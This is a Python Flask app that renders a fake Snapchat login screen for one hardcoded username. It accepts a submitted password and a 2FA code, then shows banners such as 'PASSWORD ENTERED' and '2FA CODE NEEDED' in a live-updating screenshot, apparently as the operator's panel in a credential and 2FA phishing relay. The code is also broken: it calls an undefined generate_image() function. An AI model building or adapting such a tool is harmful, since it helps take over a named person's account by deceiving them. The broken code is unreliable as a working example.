import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
import random

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')

HARDCODED_USER = "zexoghaith"

# State - starts as clean login
state = {
    'stage': 'login',   # login | password | 2fa | done
    'update_count': 0
}

def make_fresh_image():
    """Always creates a fresh image based on current state"""
    from PIL import Image, ImageDraw, ImageFont
    
    w, h = 1280, 720
    img = Image.new('RGB', (w, h), '#000000')
    draw = ImageDraw.Draw(img)

    try:
        f = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 24)
        f2 = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 13)
    except:
        f = f2 = ImageFont.load_default()

    stage = state['stage']
    now = datetime.now().strftime("%H:%M:%S")
    state['update_count'] += 1

    # Black
    draw.rectangle([0, 0, w, h], fill='#000000')

    # Top Snapchat bar
    draw.rectangle([0, 0, w, 38], fill='#111111')
    draw.text((w//2 - 60, 1), "Snapchat", fill='#FFFC00', font=f)

    # Main card
    cx, cy = 420, 50
    draw.rounded_rectangle([cx, cy, cx+440, cy+460], radius=9, fill='#1f1f1f')
    draw.text((cx+15, cy+8), "Log in to Snapchat", fill='white', font=f2)

    # Username
    draw.rounded_rectangle([cx+15, cy+45, cx+425, cy+80], radius=5, fill='#2c2c2c')
    draw.text((cx+26, cy+52), "zexoghaith", fill='white', font=f2)

    # Password
    draw.rounded_rectangle([cx+15, cy+90, cx+425, cy+125], radius=5, fill='#2c2c2c')
    if stage != 'login':
        draw.text((cx+26, cy+97), "••••••••••", fill='#22c55e', font=f2)
    else:
        draw.text((cx+26, cy+97), "••••••••••", fill='#888888', font=f2)

    # Button
    by = cy + 140
    if stage == 'password':
        draw.rounded_rectangle([cx+15, by, cx+425, by+36], radius=12, fill='#444444')
        draw.text((cx+95, by+7), "Logging in...", fill='#999999', font=f2)
    else:
        draw.rounded_rectangle([cx+15, by, cx+425, by+36], radius=12, fill='#FFFC00')
        draw.text((cx+145, by+7), "Log In", fill='#000000', font=f2)

    # Social
    draw.rounded_rectangle([cx+15, by+45, cx+425, by+75], radius=10, fill='#2c2c2c')
    draw.text((cx+80, by+52), "Continue with Google", fill='white', font=f2)

    draw.rounded_rectangle([cx+15, by+82, cx+425, by+112], radius=10, fill='#2c2c2c')
    draw.text((cx+85, by+89), "Continue with Apple", fill='white', font=f2)

    # === BIG BANNER - ONLY SHOWS WHEN PASSWORD SUBMITTED ===
    if stage == 'password':
        draw.rounded_rectangle([cx+10, cy+175, cx+430, cy+275], radius=6, fill='#3f2a00')
        draw.text((cx+18, cy+188), "PASSWORD ENTERED", fill='#f59e0b', font=f)
        draw.text((cx+18, cy+220), "Log In button was clicked", fill='white', font=f2)
        draw.text((cx+18, cy+245), "Waiting for Snapchat...", fill='#888888', font=f2)

    if stage == '2fa':
        draw.rounded_rectangle([cx+10, cy+175, cx+430, cy+300], radius=6, fill='#1e3a8a')
        draw.text((cx+22, cy+188), "2FA CODE NEEDED", fill='#60a5fa', font=f)
        draw.text((cx+22, cy+220), "Enter 6-digit code", fill='white', font=f2)
        for i in range(6):
            draw.rectangle([cx+28 + i*35, cy+250, cx+28 + i*35 + 28, cy+278], outline='#3b82f6', width=2)

    if stage == 'done':
        draw.rounded_rectangle([cx+10, cy+175, cx+430, cy+300], radius=6, fill='#052e16')
        draw.text((cx+60, cy+210), "✓ LOGGED IN!", fill='#22c55e', font=f)

    # Proof that it's live and changing
    draw.rounded_rectangle([10, 555, 260, 595], radius=4, fill='#ef4444')
    draw.text((14, 560), f"UPDATE #{state['update_count']}", fill='white', font=f)

    draw.rounded_rectangle([10, 605, 420, 650], radius=4, fill='#22c55e')
    draw.text((14, 610), f"TIME: {now}", fill='black', font=f)

    draw.text((440, 615), f"STAGE: {stage}", fill='#ff8800', font=f2)

    draw.rectangle([0, h-32, w, h], fill='#111111')
    draw.text((8, h-25), "LIVE • changes only after you submit", fill='#22c55e', font=f2)

    path = os.path.join(STATIC_DIR, 'screenshot.png')
    img.save(path, 'PNG')
    return path

def screenshot_loop():
    global state
    print("[LOOP] Starting clean Snapchat simulation")
    
    # Force clean start
    state['stage'] = 'login'
    state['update_count'] = 0
    
    generate_image()
    state['started'] = True
    
    print("[LOOP] Clean login page active")
    
    while True:
        generate_image()
        time.sleep(0.8)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json() or {}
    pw = (data.get('password') or '').strip()
    cd = (data.get('code') or '').strip()
    
    if pw:
        state['stage'] = 'password'
        print("[SUBMIT] Password submitted -> showing PASSWORD ENTERED banner")
        generate_image()
        return jsonify({'ok': True})
    
    if cd and len(cd) >= 4:
        state['stage'] = '2fa'
        print("[SUBMIT] 2FA submitted")
        generate_image()
        return jsonify({'ok': True})
    
    return jsonify({'ok': True})

@app.route('/screenshot')
def shot():
    # Always fresh
    generate_image()
    resp = send_from_directory(STATIC_DIR, 'screenshot.png')
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return resp

@app.route('/status')
def stat():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    size = os.path.getsize(path) if os.path.exists(path) else 0
    return jsonify({
        'stage': state['stage'],
        'update_count': state['update_count'],
        'size': size
    })

@app.before_request
def boot():
    if not hasattr(app, 'booted'):
        app.booted = True
        threading.Thread(target=screenshot_loop, daemon=True).start()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))